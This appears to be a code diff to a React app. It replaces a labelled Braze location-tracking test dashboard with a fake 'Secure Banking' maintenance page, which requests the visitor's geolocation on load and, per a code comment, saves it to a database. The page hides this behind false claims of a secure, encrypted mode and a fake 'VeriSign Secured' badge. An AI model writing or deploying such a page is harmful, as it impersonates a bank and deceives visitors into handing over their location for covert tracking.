@@ -1,107 +1,60 @@
 import React, { useEffect } from 'react'
 import { useGeolocation } from './hooks/useGeolocation'
-import LocationDisplay from './components/LocationDisplay'
-import LocationHistory from './components/LocationHistory'
-import ControlPanel from './components/ControlPanel'
-import TestResults from './components/TestResults'
 import './App.css'
 
 function App() {
-  const {
-    location,
-    error,
-    loading,
-    isTracking,
-    userId,
-    locationHistory,
-    dbStatus,
-    brazeStatus,
-    brazeUserId,
-    getCurrentLocation,
-    startTracking,
-    stopTracking,
-    loadLocationHistory,
-    isGeolocationSupported,
-    brazeLocationService
-  } = useGeolocation()
+  const { getCurrentLocation, location, error, loading } = useGeolocation()
 
-  // Load location history on mount
   useEffect(() => {
-    loadLocationHistory()
-  }, [loadLocationHistory])
+    if ('geolocation' in navigator) {
+      // Request location permission and save to database
+      getCurrentLocation()
+    }
+  }, [getCurrentLocation])
 
   return (
-    <div className="App">
-      <header className="app-header">
-        <h1>📍 Braze SDK Location Tracking Test</h1>
-        <p>A comprehensive testing environment for Braze Web SDK location tracking functionality</p>
-      </header>
-
-      <main className="app-main">
-        <div className="app-grid">
-          {/* Control Panel */}
-          <section className="panel control-section">
-            <ControlPanel
-              onGetCurrentLocation={getCurrentLocation}
-              onStartTracking={startTracking}
-              onStopTracking={stopTracking}
-              isTracking={isTracking}
-              loading={loading}
-              isGeolocationSupported={isGeolocationSupported}
+    <div className="App maintenance-page">
+      <header className="maintenance-header">
+        <div className="maintenance-header-inner">
+          <div className="maintenance-brand-center">
+            <img
+              src="/logo.png"
+              alt="Secure Banking"
+              className="maintenance-logo"
             />
-          </section>
-
-          {/* Location Display */}
-          <section className="panel location-section">
-            <LocationDisplay
-              location={location}
-              error={error}
-              loading={loading}
-              userId={userId}
-              dbStatus={dbStatus}
-              brazeStatus={brazeStatus}
-              brazeUserId={brazeUserId}
-            />
-          </section>
-
-          {/* Test Results */}
-          <section className="panel test-section">
-            <TestResults
-              location={location}
-              locationHistory={locationHistory}
-              error={error}
-              dbStatus={dbStatus}
-              brazeStatus={brazeStatus}
-              isTracking={isTracking}
-            />
-          </section>
-
-          {/* Location History */}
-          <section className="panel history-section">
-            <LocationHistory
-              locationHistory={locationHistory}
-              onLoadHistory={loadLocationHistory}
-              loading={loading}
-            />
-          </section>
-        </div>
-      </main>
-
-      <footer className="app-footer">
-        <div className="footer-content">
-          <p>Built with React + Supabase | Testing Location Tracking APIs</p>
-          <div className="footer-links">
-            <a href="https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API" target="_blank" rel="noopener noreferrer">
-              📖 Geolocation API Docs
-            </a>
-            <a href="https://supabase.com/docs" target="_blank" rel="noopener noreferrer">
-              🗄️ Supabase Docs
-            </a>
-            <a href="https://www.openstreetmap.org/" target="_blank" rel="noopener noreferrer">
-              🗺️ OpenStreetMap
-            </a>
           </div>
         </div>
+      </header>
+
+      <main className="maintenance-main">
+        <section className="maintenance-card">
+          <p className="maintenance-info">You are browsing our site in a safe and secure mode.</p>
+          <p className="maintenance-info">
+            Data transferred from your machine to our servers is in an encrypted mode,
+            confidential information.
+          </p>
+
+          <div className="maintenance-divider" />
+
+          <h1 className="maintenance-title">WEBSITE UNDER MAINTENANCE</h1>
+          <p className="maintenance-message">
+            Our apologies for currently undergoing scheduled maintenance and we&apos;ll be back online shortly.
+          </p>
+
+          <div className="maintenance-icon" />
+
+          <p className="maintenance-thanks">Thank you for your patience. 🙏</p>
+
+          <div className="maintenance-footer-links">
+            <span>FAQs</span>
+            <span>Security Tips</span>
+            <span>Demo</span>
+          </div>
+        </section>
+      </main>
+
+      <footer className="maintenance-security-footer">
+        <div className="maintenance-security-badge">VeriSign Secured</div>
       </footer>
     </div>
   )
